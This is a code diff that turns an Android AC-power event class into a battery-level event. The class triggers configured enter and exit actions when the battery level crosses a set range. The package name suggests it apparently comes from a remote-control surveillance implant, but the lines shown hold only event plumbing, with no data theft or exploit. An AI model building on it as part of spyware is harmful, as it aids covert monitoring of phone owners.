@@ -4,26 +4,28 @@ import java.io.IOException;
 
 import android.util.Log;
 
-import com.ht.RCSAndroidGUI.Ac;
+import com.ht.RCSAndroidGUI.Battery;
+import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.listener.ListenerAc;
+import com.ht.RCSAndroidGUI.listener.ListenerBattery;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
-public class AcEvent extends EventBase implements Observer<Ac> {
+public class EventBattery extends EventBase implements Observer<Battery> {
 	/** The Constant TAG. */
-	private static final String TAG = "AcEvent";
+	private static final String TAG = "EventBattery";
 
-	private int actionOnExit, actionOnEnter;
+	private int actionOnExit, actionOnEnter, minLevel, maxLevel;
 	private boolean inRange = false;
 	
 	@Override
 	public void begin() {
-		ListenerAc.self().attach(this);
+		ListenerBattery.self().attach(this);
 	}
 
 	@Override
 	public void end() {
-		ListenerAc.self().detach(this);
+		ListenerBattery.self().detach(this);
 	}
 
 	@Override
@@ -37,11 +39,14 @@ public class AcEvent extends EventBase implements Observer<Ac> {
 		try {
 			actionOnEnter = event.getAction();
 			actionOnExit = databuffer.readInt();
+			minLevel = databuffer.readInt();
+			maxLevel = databuffer.readInt();
+			
+			Log.d("QZ", TAG + " exitAction: " + actionOnExit + " minLevel:" + minLevel + " maxLevel:" + maxLevel);
 		} catch (final IOException e) {
 			Log.d("QZ", TAG + " Error: params FAILED");
 			return false;
 		}
-		
 		return true;
 	}
 
@@ -50,20 +55,27 @@ public class AcEvent extends EventBase implements Observer<Ac> {
 		// TODO Auto-generated method stub
 	}
 
-	// Viene richiamata dal listener (dalla dispatch())
-	public void notification(Ac a) {
-		Log.d("QZ", TAG + " Got power status notification: " + a.getStatus());
-
+	public int notification(Battery b) {
+		Log.d("QZ", TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
+		
+		if (minLevel > maxLevel)
+			return 0;
+		
 		// Nel range
-		if (a.getStatus() == true && inRange == false) {
+		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
 			inRange = true;
-			Log.d("QZ", TAG + " AC IN");
+			Log.d("QZ", TAG + " Battery IN");
 			onEnter();
-		} else if (a.getStatus() == false && inRange == true) {
+		}
+     
+		// Fuori dal range
+		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
 			inRange = false;
-			Log.d("QZ", TAG + " AC OUT");
+			Log.d("QZ", TAG + " Battery OUT");
 			onExit();
 		}
+		
+		return 0;
 	}
 	
 	public void onEnter() {
